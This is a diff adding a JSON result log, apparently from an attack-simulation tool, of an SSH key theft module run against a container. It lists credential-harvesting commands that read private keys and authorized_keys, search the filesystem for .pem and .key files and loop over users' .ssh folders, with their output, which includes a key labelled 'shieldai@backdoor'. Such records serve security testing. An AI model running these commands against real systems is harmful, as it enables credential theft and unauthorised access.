@@ -1,0 +1,114 @@
+{
+  "timestamp": 1779617422.0497265,
+  "target_ip": "172.17.0.2",
+  "source": "ssh_key_theft",
+  "data": {
+    "severity": "LOW",
+    "elapsed": 0.7118189334869385,
+    "mitres": [
+      {
+        "name": "Unsecured Credentials: Private Keys",
+        "mitre_id": "T1552.004",
+        "mitre_tactic": "Credential Access",
+        "description": "Vol de clés privées SSH (~/.ssh/id_rsa) pour accéder à d'autres systèmes sans authentification."
+      }
+    ],
+    "results": {
+      "stolen_keys": [],
+      "stolen_keys_count": 0,
+      "usable_keys": [],
+      "usable_keys_count": 0,
+      "known_hosts": [],
+      "known_hosts_count": 0,
+      "commands": {
+        "ls -la ~/.ssh/ 2>/dev/null || echo 'SSH_DIR_DENIED'": {
+          "stdout": "total 20\ndrwx------. 1 root root 4096 May 24 11:09 .\ndrwx------. 1 root root 4096 May 24 11:07 ..\n-rwx------. 1 root root  231 May 24 11:09 authorized_keys\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "ls -la /root/.ssh/ 2>/dev/null || echo 'ROOT_SSH_DIR_DENIED'": {
+          "stdout": "total 20\ndrwx------. 1 root root 4096 May 24 11:09 .\ndrwx------. 1 root root 4096 May 24 11:07 ..\n-rwx------. 1 root root  231 May 24 11:09 authorized_keys\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/id_rsa 2>/dev/null || echo 'ID_RSA_DENIED'": {
+          "stdout": "ID_RSA_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/id_ed25519 2>/dev/null || echo 'ID_ED25519_DENIED'": {
+          "stdout": "ID_ED25519_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/id_ecdsa 2>/dev/null || echo 'ID_ECDSA_DENIED'": {
+          "stdout": "ID_ECDSA_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/id_dsa 2>/dev/null || echo 'ID_DSA_DENIED'": {
+          "stdout": "ID_DSA_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.ssh/id_rsa 2>/dev/null || echo 'ROOT_ID_RSA_DENIED'": {
+          "stdout": "ROOT_ID_RSA_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.ssh/id_ed25519 2>/dev/null || echo 'ROOT_ID_ED25519_DENIED'": {
+          "stdout": "ROOT_ID_ED25519_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.ssh/id_ecdsa 2>/dev/null || echo 'ROOT_ID_ECDSA_DENIED'": {
+          "stdout": "ROOT_ID_ECDSA_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/known_hosts 2>/dev/null || echo 'KNOWN_HOSTS_DENIED'": {
+          "stdout": "KNOWN_HOSTS_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.ssh/known_hosts 2>/dev/null || echo 'ROOT_KNOWN_HOSTS_DENIED'": {
+          "stdout": "ROOT_KNOWN_HOSTS_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/authorized_keys 2>/dev/null || echo 'AUTHORIZED_KEYS_DENIED'": {
+          "stdout": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/+6FEk/rd+EW5dg49wKbVZ0o8sCRLT5tLdxFW4jqRSE9GNksgTqBXwrYolPC2ESqWHSi9unHqNaQyMFz6BQuBMHCiZ5iJcb7IjYwxDy9Nfq6jbBZcnSye6Uzi90rq8BTRzdUDe/wME49FmJUBxaA9v/nr2/4qybj4+6ntPH0law== shieldai@backdoor\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.ssh/authorized_keys 2>/dev/null || echo 'ROOT_AUTHORIZED_KEYS_DENIED'": {
+          "stdout": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/+6FEk/rd+EW5dg49wKbVZ0o8sCRLT5tLdxFW4jqRSE9GNksgTqBXwrYolPC2ESqWHSi9unHqNaQyMFz6BQuBMHCiZ5iJcb7IjYwxDy9Nfq6jbBZcnSye6Uzi90rq8BTRzdUDe/wME49FmJUBxaA9v/nr2/4qybj4+6ntPH0law== shieldai@backdoor\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.ssh/config 2>/dev/null || echo 'SSH_CONFIG_DENIED'": {
+          "stdout": "SSH_CONFIG_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null | grep -v '/proc\\|/sys\\|/dev' | head -20": {
+          "stdout": "",
+          "stderr": "",
+          "returncode": 0
+        },
+        "find / -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v '/proc\\|/sys\\|/dev' | head -20": {
+          "stdout": "/var/lib/fwupd/pki/secret.key\n/var/lib/fwupd/pki/client.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/b4167d416c079b265c92d902a2730760e21321345af88dc4483c675c236dbb12/diff/usr/local/lib/python3.10/site-packages/pip/_vendor/certifi/cacert.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/4f42f2cc4bf75f0bd2e856359b903402667fdc0ea8cda2d833dceacc0a34fac0/diff/usr/local/lib/ruby/3.2.0/rubygems/ssl_certs/rubygems.org/GlobalSignRootCA_R3.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/4f42f2cc4bf75f0bd2e856359b903402667fdc0ea8cda2d833dceacc0a34fac0/diff/usr/local/lib/ruby/3.2.0/rubygems/ssl_certs/rubygems.org/GlobalSignRootCA.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/usr/lib/ssl/cert.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/SSL.com_Root_Certification_Authority_ECC.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/CommScope_Public_Trust_ECC_Root-02.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/GTS_Root_R4.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/Actalis_Authentication_Root_CA.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/USERTrust_RSA_Certification_Authority.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/vTrus_Root_CA.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/IdenTrust_Public_Sector_Root_CA_1.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/GlobalSign_Root_CA.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/Entrust_Root_Certification_Authority.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/CommScope_Public_Trust_RSA_Root-02.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/emSign_ECC_Root_CA_-_C3.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/Starfield_Class_2_CA.pem\n/usr/bin/mnt/abd77d09-bb8f-40dd-b081-bab5828fa0a4/docker_data/docker/overlay2/eda118905812dcd5bbf6f353955eff2d456f5cf6f6670252a38002160b8906af/diff/etc/ssl/certs/ACCVRAIZ1.pem\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "for u in $(ls /home/ 2>/dev/null); do echo \"=== $u ===\"; ls /home/$u/.ssh/ 2>/dev/null; cat /home/$u/.ssh/id_rsa 2>/dev/null; cat /home/$u/.ssh/id_ed25519 2>/dev/null; done": {
+          "stdout": "",
+          "stderr": "",
+          "returncode": 0
+        }
+      },
+      "success_number": 17,
+      "success_rate": 1.0
+    }
+  }
+}
